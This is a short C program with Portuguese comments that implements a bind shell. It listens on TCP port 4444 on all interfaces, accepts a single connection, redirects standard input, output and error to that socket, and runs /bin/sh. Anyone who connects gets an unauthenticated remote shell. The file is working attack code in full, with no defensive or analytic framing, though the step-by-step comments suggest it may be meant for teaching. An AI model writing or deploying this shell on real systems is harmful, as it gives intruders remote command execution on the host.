#define _GNU_SOURCE
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

int main() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    /* SO_REUSEADDR: permite religar na mesma porta sem esperar TIME_WAIT */
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(4444);
    sa.sin_addr.s_addr = INADDR_ANY;   /* 0.0.0.0 - todas as interfaces */

    bind(sockfd, (struct sockaddr *)&sa, sizeof(sa));
    listen(sockfd, 1);                 /* backlog = 1 */

    int clientfd = accept(sockfd, NULL, NULL);  /* bloqueia até alguém conectar */

    dup2(clientfd, 0);   /* stdin  → socket */
    dup2(clientfd, 1);   /* stdout → socket */
    dup2(clientfd, 2);   /* stderr → socket */

    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
